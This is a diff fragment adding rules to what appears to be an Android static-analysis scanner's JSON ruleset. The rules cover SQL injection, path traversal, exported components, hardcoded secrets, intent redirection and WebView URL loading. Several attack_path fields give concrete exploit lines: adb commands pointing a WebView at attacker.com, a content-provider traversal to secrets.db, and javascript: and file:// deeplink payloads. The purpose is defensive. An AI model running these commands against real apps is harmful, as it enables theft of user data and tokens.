+      "remediation": "NEVER call handler.proceed() unconditionally. Call handler.cancel() to reject invalid certificates.",
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["network", "webview", "ssl", "critical"]
+    },
+    {
+      "id": "component-sql-injection",
+      "title": "SQL Injection in ContentProvider",
+      "severity": "Critical",
+      "category": "OWASP-M4-InputValidation",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "rawQuery\\s*\\([^)]*\\+[^)]*(?:selection|uri|projection)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "execSQL\\s*\\([^)]*\\+", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "query\\s*\\([^)]*String\\.format", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-89"], "references": ["https://blog.oversecured.com/Android-security-vulnerabilities-in-content-providers/"], "confidence": "high"},
+      "description": "SQL query is constructed using string concatenation with user input. This enables SQL injection attacks.",
+      "attack_path": "Attacker passes malicious SQL in query parameters to ContentProvider, extracting or modifying database data.",
+      "remediation": "Use parameterized queries with selection and selectionArgs. Never concatenate user input into SQL strings.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["sql", "injection", "contentprovider", "critical"]
+    },
+    {
+      "id": "component-path-traversal",
+      "title": "Path Traversal in ContentProvider",
+      "severity": "High",
+      "category": "OWASP-M4-InputValidation",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "openFile[^}]*new\\s+File\\s*\\([^)]*uri\\.get(?:Path|LastPathSegment)", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "openFile[^}]*getPath\\s*\\(\\s*\\)[^}]*ParcelFileDescriptor", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-22"], "references": ["https://blog.oversecured.com/Android-security-vulnerabilities-in-content-providers/"], "confidence": "high"},
+      "description": "ContentProvider openFile() uses URI path directly to access files. Attacker can use ../ sequences to access arbitrary files.",
+      "attack_path": "Attacker sends URI like content://app/../../data/data/app/databases/secrets.db to read private files.",
+      "remediation": "Canonicalize the path and verify it's within allowed directory. Use getCanonicalPath() and check prefix.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["path-traversal", "contentprovider", "lfi"]
+    },
+    {
+      "id": "component-broadcast-receiver-exported",
+      "title": "Exported BroadcastReceiver Without Permission",
+      "severity": "High",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [
+          {"xpath": ".//receiver[@android:exported='true' and not(@android:permission)]", "condition": "exists"},
+          {"xpath": ".//receiver[intent-filter and not(@android:exported='false') and not(@android:permission)]", "condition": "exists"}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-926"], "references": ["https://developer.android.com/guide/components/broadcasts#security"], "confidence": "high"},
+      "description": "BroadcastReceiver is exported without permission protection. Any app can send broadcasts to trigger its functionality.",
+      "attack_path": "Attacker sends crafted broadcast to trigger privileged actions or cause denial of service.",
+      "remediation": "Set android:exported=\"false\" if not needed externally. Add android:permission with signature-level protection.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["broadcast", "exported", "permission"]
+    },
+    {
+      "id": "component-service-exported",
+      "title": "Exported Service Without Permission",
+      "severity": "High",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [
+          {"xpath": ".//service[@android:exported='true' and not(@android:permission)]", "condition": "exists"},
+          {"xpath": ".//service[intent-filter and not(@android:exported='false') and not(@android:permission)]", "condition": "exists"}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-926"], "confidence": "high"},
+      "description": "Service is exported without permission protection. Any app can bind to or start this service.",
+      "attack_path": "Attacker binds to service and calls its methods, potentially accessing sensitive functionality.",
+      "remediation": "Set android:exported=\"false\" if not needed externally. Add android:permission for protection.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["service", "exported", "permission"]
+    },
+    {
+      "id": "component-provider-exported",
+      "title": "Exported ContentProvider Without Permission",
+      "severity": "High",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [{"xpath": ".//provider[@android:exported='true' and not(@android:permission) and not(@android:readPermission) and not(@android:writePermission)]", "condition": "exists"}]
+      },
+      "metadata": {"cwe": ["CWE-926"], "confidence": "high"},
+      "description": "ContentProvider is exported without permission protection. Any app can query, insert, update, or delete data.",
+      "attack_path": "Attacker queries provider to extract data or modifies data to cause app malfunction.",
+      "remediation": "Set android:exported=\"false\" or add read/write permissions. Use grantUriPermission for temporary access.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["contentprovider", "exported", "permission"]
+    },
+    {
+      "id": "component-activity-exported",
+      "title": "Exported Activity Without Permission",
+      "severity": "Medium",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [{"xpath": ".//activity[@android:exported='true' and not(@android:permission)]", "condition": "exists"}]
+      },
+      "metadata": {"cwe": ["CWE-926"], "confidence": "medium"},
+      "description": "Activity is explicitly exported without permission. Any app can launch this activity.",
+      "attack_path": "Attacker launches internal activity to bypass authentication or access restricted functionality.",
+      "remediation": "Remove android:exported=\"true\" if not needed. Add permission protection for sensitive activities.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["activity", "exported", "permission"]
+    },
+    {
+      "id": "component-intent-filter-data-leak",
+      "title": "Intent Data Processed Without Validation",
+      "severity": "Medium",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "getIntent\\s*\\(\\s*\\)\\.get(?:String|Int|Long|Boolean|Serializable|Parcelable)Extra\\s*\\([^)]+\\)[^;]*(?:setText|setContent|loadUrl|query|execute)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-20"], "confidence": "medium"},
+      "description": "Intent extras are used directly without validation. Attacker-controlled data may cause injection or logic bypass.",
+      "attack_path": "Attacker sends Intent with malicious extras that are processed without sanitization.",
+      "remediation": "Validate all Intent extras before use. Check calling package for internal-only activities.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["intent", "validation", "injection"]
+    },
+    {
+      "id": "storage-world-readable",
+      "title": "World-Readable File Mode",
+      "severity": "High",
+      "category": "OWASP-M9-DataStorage",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "MODE_WORLD_READABLE", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-732"], "confidence": "high"},
+      "description": "MODE_WORLD_READABLE allows any app to read the file. This deprecated mode exposes sensitive data to all apps on older Android versions.",
+      "attack_path": "Malicious app reads sensitive data from world-readable files using standard file APIs.",
+      "remediation": "Use MODE_PRIVATE for all files. Share data through ContentProvider with proper permissions.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["storage", "permissions", "deprecated"]
+    },
+    {
+      "id": "storage-world-writable",
+      "title": "World-Writable File Mode",
+      "severity": "Critical",
+      "category": "OWASP-M9-DataStorage",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "MODE_WORLD_WRITEABLE", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-732"], "confidence": "high"},
+      "description": "MODE_WORLD_WRITEABLE allows any app to write to the file. This can lead to data tampering or code injection.",
+      "attack_path": "Malicious app modifies configuration files or injects malicious data that the victim app trusts.",
+      "remediation": "Never use MODE_WORLD_WRITEABLE. Use MODE_PRIVATE and share data through ContentProvider.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["storage", "permissions", "critical"]
+    },
+    {
+      "id": "storage-external-write",
+      "title": "Sensitive Data Written to External Storage",
+      "severity": "High",
+      "category": "OWASP-M9-DataStorage",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getExternalStorageDirectory[^;]*(?:password|token|secret|key|auth|credential|ssn|credit)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "(?:password|token|secret|key|auth|credential)[^;]*getExternalFilesDir", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-922"], "references": ["https://developer.android.com/training/data-storage"], "confidence": "high"},
+      "description": "Sensitive data (credentials, tokens) is written to external storage, which is readable by any app.",
+      "attack_path": "1. Malicious app requests READ_EXTERNAL_STORAGE permission\n2. Reads sensitive files from external storage\n3. Exfiltrates credentials, tokens, or user data",
+      "remediation": "Store sensitive data in internal storage (getFilesDir()) and encrypt it. Never store credentials on external storage.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["storage", "external", "sdcard"]
+    },
+    {
+      "id": "storage-sharedprefs-sensitive",
+      "title": "Sensitive Data in SharedPreferences",
+      "severity": "Medium",
+      "category": "OWASP-M9-DataStorage",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getSharedPreferences[^;]*\\.edit\\s*\\(\\s*\\)[^;]*\\.put(?:String|Int|Long)\\s*\\([^)]*(?:password|token|secret|key|auth|session|credit|ssn|pin)[^)]*\\)", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "SharedPreferences[^;]*(?:password|token|secret|key|auth|session)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-312"], "confidence": "medium"},
+      "description": "Sensitive data appears to be stored in SharedPreferences. While private by default, this data is stored in plaintext XML files accessible on rooted devices.",
+      "attack_path": "On rooted device or via backup, attacker extracts SharedPreferences XML and reads sensitive data.",
+      "remediation": "Use EncryptedSharedPreferences from AndroidX Security library. Store tokens in Android Keystore.",
+      "adb_category": "backup",
+      "enabled": true,
+      "tags": ["storage", "sharedprefs", "plaintext"]
+    },
+    {
+      "id": "storage-sqlite-sensitive",
+      "title": "Sensitive Data in SQLite Database",
+      "severity": "Medium",
+      "category": "OWASP-M9-DataStorage",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "SQLiteDatabase[^;]*(?:execSQL|insert|update|replace)[^;]*(?:password|token|secret|key|auth|session|credit|ssn)", "flags": "ims", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-312"], "confidence": "medium"},
+      "description": "Sensitive data may be stored in unencrypted SQLite database. Database files can be extracted from rooted devices or backups.",
+      "attack_path": "Attacker extracts database file via backup or root access and reads sensitive data directly.",
+      "remediation": "Use SQLCipher for database encryption. Alternatively, encrypt sensitive columns individually.",
+      "adb_category": "backup",
+      "enabled": true,
+      "tags": ["storage", "sqlite", "database"]
+    },
+    {
+      "id": "storage-hardcoded-credentials",
+      "title": "Hardcoded Credentials",
+      "severity": "Critical",
+      "category": "OWASP-M1-Credentials",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "(?:private|public|protected|static|final|String|val|var)\\s+(?:static\\s+)?(?:final\\s+)?\\w*(?:password|passwd|pwd|secret|api_?key|apikey|auth_?token|access_?token|private_?key)\\w*\\s*=\\s*[\"'][^\"']{8,}[\"']", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "(?:AWS|AZURE|GCP|FIREBASE|GOOGLE|FACEBOOK|TWITTER|STRIPE|TWILIO|SENDGRID|SLACK)_?(?:KEY|SECRET|TOKEN|API_KEY|ACCESS_KEY|SECRET_KEY)\\s*=\\s*[\"'][A-Za-z0-9+/=_-]{16,}[\"']", "flags": "", "file_types": [".java", ".kt", ".xml"]},
+          {"pattern": "<string\\s+name\\s*=\\s*[\"'](?:api_?key|password|secret|auth_?token|access_?token)[\"'][^>]*>\\s*[^<]{8,}\\s*</string>", "flags": "i", "file_types": [".xml"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-798"], "references": ["https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password"], "confidence": "high"},
+      "description": "Credentials or API keys appear to be hardcoded in the source code. Anyone who decompiles the APK can extract these secrets.",
+      "attack_path": "Attacker decompiles APK, extracts hardcoded credentials, and uses them to access backend services or user accounts.",
+      "remediation": "Remove hardcoded secrets. Use environment variables, secure key storage, or fetch secrets from a secure backend at runtime.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["credentials", "hardcoded", "api-key", "critical"]
+    },
+    {
+      "id": "storage-backup-enabled",
+      "title": "Android Backup Enabled",
+      "severity": "Medium",
+      "category": "OWASP-M9-DataStorage",
+      "detection": {
+        "type": "manifest",
+        "manifest_checks": [{"xpath": ".//application[@android:allowBackup='true']", "condition": "exists"}]
+      },
+      "metadata": {"cwe": ["CWE-530"], "references": ["https://developer.android.com/guide/topics/data/backup"], "confidence": "high"},
+      "description": "android:allowBackup is true (default). App data can be backed up via adb backup and restored on another device, potentially exposing sensitive data.",
+      "attack_path": "Attacker with USB access runs 'adb backup' to extract app data including databases, SharedPreferences, and files.",
+      "remediation": "Set android:allowBackup=\"false\" in manifest, or implement BackupAgent to exclude sensitive data from backups.",
+      "adb_category": "backup",
+      "enabled": false,
+      "tags": ["backup", "data-extraction"]
+    },
+    {
+      "id": "intent-redirect-unvalidated",
+      "title": "Unvalidated Intent Redirect",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "startActivity\\s*\\(\\s*(?:getIntent\\s*\\(\\s*\\)|intent)\\.getParcelableExtra", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "startActivity\\s*\\([^)]*getIntent\\s*\\(\\s*\\)\\.get(?:Parcelable|Serializable)Extra", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-926", "CWE-940"], "references": ["https://blog.oversecured.com/Android-Access-to-app-protected-components/"], "confidence": "high"},
+      "description": "An Intent received from external sources is used to start an Activity without validation. This can allow attackers to access protected app components.",
+      "attack_path": "1. Attacker sends crafted Intent with malicious nested Intent\n2. Victim app blindly forwards to internal Activity\n3. Attacker gains access to protected components",
+      "remediation": "Validate Intent extras before use. Use explicit Intents with setComponent() or setClassName(). Check the caller's identity.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["intent", "redirect", "component-hijack"]
+    },
+    {
+      "id": "deeplink-no-validation",
+      "title": "DeepLink Data Used Without Validation",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getIntent\\s*\\(\\s*\\)\\.getData\\s*\\(\\s*\\)\\.get(?:Path|Query|Host|Fragment)", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "intent\\.getData\\s*\\(\\s*\\)(?:\\.toString\\s*\\(\\s*\\))?[^;]*(?:new\\s+File|openFile|FileInputStream|loadUrl)", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-22", "CWE-939"], "references": ["https://blog.oversecured.com/Evernote-Universal-XSS-theft-of-all-cookies-from-all-sites-and-more/"], "confidence": "medium"},
+      "description": "DeepLink URI data is used directly without validation, potentially enabling path traversal or injection attacks.",
+      "attack_path": "Attacker sends deeplink with malicious path (e.g., /../../../data/data/app/secrets) to access restricted files or inject data.",
+      "remediation": "Validate and sanitize all URI components. Use getCanonicalPath() for file operations. Reject URIs with '..' or unexpected schemes.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["deeplink", "path-traversal", "injection"]
+    },
+    {
+      "id": "implicit-intent-sensitive-data",
+      "title": "Sensitive Data in Implicit Intent",
+      "severity": "Medium",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "new\\s+Intent\\s*\\([^)]*\\)(?:[^;]*\\.putExtra\\s*\\([^)]*(?:token|password|secret|auth|session|key|credential)[^)]*\\))+", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-927"], "references": ["https://developer.android.com/training/basics/intents/sending"], "confidence": "medium"},
+      "description": "Sensitive data (tokens, passwords) may be sent via implicit Intent, which could be intercepted by malicious apps.",
+      "attack_path": "Malicious app registers intent-filter for the same action and receives sensitive data intended for legitimate app.",
+      "remediation": "Use explicit Intents for sensitive data. Set the package name or ComponentName explicitly.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["intent", "sensitive-data", "implicit"]
+    },
+    {
+      "id": "pending-intent-mutable",
+      "title": "Mutable PendingIntent with Implicit Intent",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "PendingIntent\\.get(?:Activity|Service|Broadcast)\\s*\\([^)]*new\\s+Intent\\s*\\([^)]*\\)[^)]*FLAG_MUTABLE", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-927"], "references": ["https://developer.android.com/about/versions/12/behavior-changes-12#pending-intent-mutability"], "confidence": "high"},
+      "description": "Mutable PendingIntent created with implicit Intent. Malicious app can intercept and modify the PendingIntent.",
+      "attack_path": "1. App creates mutable PendingIntent with implicit action\n2. Attacker app registers for same action with higher priority\n3. Attacker modifies Intent before it's delivered\n4. Victim app's action is hijacked to attacker component",
+      "remediation": "Use FLAG_IMMUTABLE with explicit Intents. Only use FLAG_MUTABLE when mutability is required (e.g., inline reply).",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["intent", "pending-intent", "hijack"]
+    },
+    {
+      "id": "broadcast-sensitive-data",
+      "title": "Sensitive Data in Broadcast",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "sendBroadcast\\s*\\([^)]*putExtra\\s*\\([^)]*(?:token|password|secret|auth|session|key|credential)[^)]*\\)", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-927"], "references": ["https://developer.android.com/guide/components/broadcasts#security-and-best-practices"], "confidence": "high"},
+      "description": "Broadcast contains sensitive data (tokens, passwords) and can be received by any app.",
+      "attack_path": "1. Malicious app registers receiver for the broadcast action\n2. App sends broadcast with sensitive data\n3. Attacker intercepts authentication tokens or credentials\n4. Attacker impersonates user or accesses protected resources",
+      "remediation": "Use LocalBroadcastManager for internal broadcasts. Use signature-level permissions for inter-app broadcasts. Never put credentials in broadcasts.",
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["broadcast", "sensitive-data", "leak"]
+    },
+    {
+      "id": "intent-scheme-url",
+      "title": "Intent Scheme URL Handling",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "Intent\\.parseUri\\s*\\(", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "intent://", "flags": "i", "file_types": [".java", ".kt", ".xml"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-939"], "references": ["https://www.mbsd.jp/Whitepaper/IntentScheme.pdf"], "confidence": "high"},
+      "description": "Intent scheme URLs (intent://) are parsed and may be used to launch arbitrary components if not properly validated.",
+      "attack_path": "Attacker crafts intent:// URL that launches internal components or passes malicious data.",
+      "remediation": "Validate Intent created from URI. Use URI_ALLOW_UNSAFE flag carefully. Whitelist allowed components.",
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["intent", "scheme", "url"]
+    },
+    {
+      "id": "activity-result-unvalidated",
+      "title": "Activity Result Data Unvalidated",
+      "severity": "Medium",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "onActivityResult[^}]*data\\.get(?:String|Int|Parcelable|Serializable)Extra", "flags": "ims", "file_types": [".java", ".kt"]}]
+      },
+      "metadata": {"cwe": ["CWE-20"], "confidence": "low"},
+      "description": "Data from Activity results may not be validated. Malicious apps responding to startActivityForResult can return crafted data.",
+      "attack_path": "When app launches implicit intent for result, malicious app can respond with crafted data.",
+      "remediation": "Validate all data received from Activity results. Use explicit intents when possible.",
+      "adb_category": "general",
+      "enabled": false,
+      "tags": ["intent", "activity-result", "validation"]
+    },
+    {
+      "id": "bb-domain-contains-bypass",
+      "title": "Domain Validation Bypass via contains()",
+      "severity": "High",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "getHost\\(\\)[^;]*\\.contains\\s*\\([\"'][a-zA-Z0-9.-]+\\.[a-z]{2,}[\"']\\)", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "description": "Domain validation using String.contains() can be bypassed. Example: `host.contains(\"instagram.com\")` allows `instagram.com.attacker.com` to pass.",
+      "attack_path": "**Bypass:** `instagram.com` check -> `instagram.com.evil.com`. Craft deeplink with bypass URL, app loads attacker content thinking it's trusted.",
+      "remediation": "Use proper URL parsing:\n```java\nif (host.equals(\"trusted.com\") || host.endsWith(\".trusted.com\")) { // Safe }\n```",
+      "metadata": {"cwe": ["CWE-939", "CWE-20"], "references": ["https://blog.oversecured.com/Android-security-checklist-intent-handling/"], "confidence": "high"},
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["bugbounty", "domain-validation", "bypass"]
+    },
+    {
+      "id": "bb-cordova-file-exfiltration",
+      "title": "Cordova Plugin File Exfiltration",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "CordovaPlugin[^}]*openInputStream|ContentResolver[^;]*file://", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "_cordovaNative\\.exec\\s*\\([^)]*ContentUri|resolveContentUri", "flags": "i", "file_types": [".java", ".kt", ".js"]}
+        ]
+      },
+      "description": "Cordova plugin allows reading arbitrary files via content:// or file:// URIs. Attacker can exfiltrate app databases, cookies, SharedPreferences.",
+      "attack_path": "Find deeplink that loads attacker URL in Cordova WebView. JavaScript calls plugin to read sensitive files. Data exfiltrated to attacker server.",
+      "remediation": "1. Validate URI scheme - block file:// URIs\n2. Restrict readable paths to specific directories\n3. Don't expose file-reading plugins to WebView",
+      "metadata": {"cwe": ["CWE-22", "CWE-200", "CWE-749"], "references": ["https://cordova.apache.org/docs/en/latest/guide/appdev/security/"], "confidence": "high"},
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["bugbounty", "cordova", "file-read", "critical"]
+    },
+    {
+      "id": "bb-deeplink-webview-load",
+      "title": "DeepLink Loads Arbitrary URL in WebView",
+      "severity": "Critical",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getIntent\\(\\)[^;]*getData\\(\\)[^;]*(?:loadUrl|setUrl)", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "intent\\.get(?:String|Data)Extra[^;]*[\"']url[\"'][^;]*loadUrl", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "description": "DeepLink handler loads URL from intent directly into WebView without validation. Allows loading attacker-controlled content with app privileges.",
+      "attack_path": "Craft malicious deeplink: `myapp://open?url=https://attacker.com/payload.html`. Attacker page loads in privileged WebView. If JavaScript bridges exist, call them.",
+      "remediation": "1. Validate URL against allowlist of trusted domains\n2. Never load arbitrary external URLs in internal WebView\n3. Validate URL scheme (https only)",
+      "metadata": {"cwe": ["CWE-939", "CWE-749", "CWE-927"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "adb_category": "webview",
+      "enabled": true,
+      "tags": ["bugbounty", "deeplink", "webview", "critical"]
+    },
+    {
+      "id": "bb-intent-redirect-startactivity",
+      "title": "Intent Redirect via getParcelableExtra",
+      "severity": "Critical",
+      "category": "Intent-DeepLink",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getParcelableExtra[^;]*Intent[^;]*startActivity", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "startActivity\\s*\\([^)]*getParcelableExtra", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "description": "App extracts Intent from extras and starts it directly. Attacker can craft Intent targeting non-exported activities, bypassing access controls.",
+      "attack_path": "Create inner intent targeting non-exported activity, wrap in outer intent to exported activity. Victim app starts attacker-controlled Intent.",
+      "remediation": "1. Never start Intent from untrusted extras\n2. If needed, validate Intent target is in allowlist\n3. Use PendingIntent instead of raw Intent extras",
+      "metadata": {"cwe": ["CWE-926", "CWE-927", "CWE-940"], "references": ["https://blog.oversecured.com/Android-Access-to-app-protected-components/"], "confidence": "high"},
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["bugbounty", "intent-redirect", "critical"]
+    },
+    {
+      "id": "bb-react-native-secrets",
+      "title": "Hardcoded Secrets in React Native Bundle",
+      "severity": "Critical",
+      "category": "OWASP-M1-Credentials",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "ZENDESK.*(?:KEY|SECRET|TOKEN)|zendeskKey|zendeskSecret", "flags": "i", "file_types": [".java", ".kt", ".js"]},
+          {"pattern": "(?:API_KEY|SECRET_KEY|PRIVATE_KEY)\\s*[=:]\\s*[\"'][A-Za-z0-9+/=_-]{20,}[\"']", "flags": "i", "file_types": [".java", ".kt", ".js"]}
+        ]
+      },
+      "description": "API keys or secrets found that may be embedded in React Native bundle (index.android.bundle). These can be extracted by decompiling the APK.",
+      "attack_path": "Extract APK, find React Native bundle, decompile Hermes bytecode, search for secrets. Use extracted credentials to access backend services.",
+      "remediation": "1. Never hardcode secrets in client code\n2. Use server-side authentication for sensitive APIs\n3. Implement proper secrets management",
+      "metadata": {"cwe": ["CWE-798", "CWE-312"], "references": ["https://reactnative.dev/docs/security"], "confidence": "high"},
+      "adb_category": "general",
+      "enabled": true,
+      "tags": ["bugbounty", "react-native", "secrets", "critical"]
+    },
+    {
+      "id": "bb-exported-webview-activity",
+      "title": "Exported Activity with WebView URL Parameter",
+      "severity": "High",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [{"pattern": "WebViewActivity|BrowserActivity|WebActivity", "flags": "i", "file_types": [".java", ".kt"]}]
+      },
+      "description": "Exported activity that loads URLs in WebView. If URL comes from Intent without validation, attacker can load arbitrary content.",
+      "attack_path": "Test URL parameter injection: `adb shell am start -n com.app/.WebViewActivity --es url \"https://attacker.com/evil.html\"`",
+      "remediation": "1. Don't export WebView activities\n2. Validate URL against domain allowlist\n3. Use android:exported=\"false\" in manifest",
+      "metadata": {"cwe": ["CWE-926", "CWE-749"], "references": ["https://developer.android.com/guide/components/intents-filters#ExportedActivity"], "confidence": "medium"},
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["bugbounty", "exported", "webview"]
+    },
+    {
+      "id": "bb-sso-cookie-manipulation",
+      "title": "SSO Activity Exposes Session Cookies",
+      "severity": "Critical",
+      "category": "Component-Exposure",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "SSOActivity|SSOLogin|SingleSignOn.*Activity", "flags": "i", "file_types": [".java", ".kt"]},
+          {"pattern": "setHttpOnly\\s*\\(\\s*false|httpOnly.*=.*false", "flags": "i", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "description": "SSO activity may expose session cookies or allow manipulation of cookie attributes. Removing httpOnly allows JavaScript cookie theft.",
+      "attack_path": "If httpOnly can be removed, load attacker page in WebView context, JavaScript reads document.cookie, steal session tokens.",
+      "remediation": "1. Don't export SSO activities\n2. Never allow external control of cookie attributes\n3. Always set httpOnly=true for session cookies",
+      "metadata": {"cwe": ["CWE-614", "CWE-926", "CWE-384"], "references": ["https://owasp.org/www-community/controls/SecureCookieAttribute"], "confidence": "medium"},
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["bugbounty", "sso", "cookie", "critical"]
+    },
+    {
+      "id": "bb-path-traversal-provider",
+      "title": "Path Traversal in ContentProvider",
+      "severity": "Critical",
+      "category": "OWASP-M4-InputValidation",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "openFile[^}]*new\\s+File\\s*\\([^)]*uri\\.(?:getPath|getLastPathSegment)", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "ParcelFileDescriptor\\.open\\s*\\([^)]*getPath", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "description": "ContentProvider's openFile() uses URI path directly to construct File object without validating for path traversal (../) sequences.",
+      "attack_path": "`adb shell content read --uri \"content://com.app.provider/../databases/secrets.db\"`",
+      "remediation": "Validate path doesn't contain `..` or encoded variants. Use getCanonicalPath() and verify it's under allowed directory.",
+      "metadata": {"cwe": ["CWE-22", "CWE-23"], "references": ["https://blog.oversecured.com/Android-security-checklist-content-provider/"], "confidence": "high"},
+      "adb_category": "component",
+      "enabled": true,
+      "tags": ["bugbounty", "path-traversal", "provider", "critical"]
+    },
+    {
+      "id": "os-webview-loadurl-unvalidated",
+      "title": "WebView Loads Unvalidated URL from Intent/DeepLink",
+      "severity": "Critical",
+      "category": "WebView",
+      "detection": {
+        "type": "regex",
+        "patterns": [
+          {"pattern": "getQueryParameter\\s*\\([^)]+\\)[^;]*;[^}]*loadUrl\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]},
+          {"pattern": "getStringExtra\\s*\\([^)]+\\)[^;]*;[^}]*loadUrl\\s*\\(", "flags": "ims", "file_types": [".java", ".kt"]}
+        ]
+      },
+      "metadata": {"cwe": ["CWE-939", "CWE-601"], "references": ["https://blog.oversecured.com/Android-security-checklist-webview/"], "confidence": "high"},
+      "description": "WebView loads URL directly from Intent extra or deeplink parameter without validation. Attacker can inject javascript:, file:, or malicious URLs to steal tokens, access files, or perform XSS.",
+      "attack_path": "**Exploitation:**\n1. Create malicious deeplink: `app://host?url=javascript:alert(document.cookie)`\n2. Or inject file URL: `app://host?url=file:///data/data/pkg/shared_prefs/auth.xml`",
+      "remediation": "1. Validate URL scheme (only allow https://)\n2. Validate host against allowlist\n3. Never attach auth headers to user-controlled URLs",
